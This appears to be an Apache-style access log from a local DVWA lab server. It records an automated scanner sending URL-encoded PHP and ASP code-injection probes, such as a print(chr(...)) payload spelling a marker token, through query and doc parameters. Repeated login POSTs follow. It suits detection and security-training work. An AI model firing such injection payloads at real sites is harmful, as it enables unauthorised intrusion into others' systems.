172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/spanner.png?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/RandomStorm.png?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/spanner.png?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/spanner.png?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/images/RandomStorm.png?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 301 832 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 301 832 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/add_event_listeners.js?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/add_event_listeners.js?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 301 814 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 301 820 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/add_event_listeners.js?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 301 802 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/add_event_listeners.js?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/add_event_listeners.js?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 301 648 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 301 622 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/add_event_listeners.js?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 301 618 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/add_event_listeners.js?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/add_event_listeners.js?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/dvwaPage.js?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /favicon.ico?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/dvwaPage.js?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /favicon.ico?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/dvwaPage.js?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /favicon.ico?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/dvwaPage.js?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /favicon.ico?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/dvwaPage.js?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /favicon.ico?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/dvwaPage.js?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /favicon.ico?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/dvwaPage.js?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /favicon.ico?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /dvwa/js/dvwaPage.js?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:35 +0000] "GET /favicon.ico?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?doc=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?doc=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?doc=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?doc=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?doc=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?doc=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?doc=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /instructions.php?doc=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /login.php?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /login.php?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /login.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /login.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /login.php?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /login.php?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /login.php?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /login.php?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 1895 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
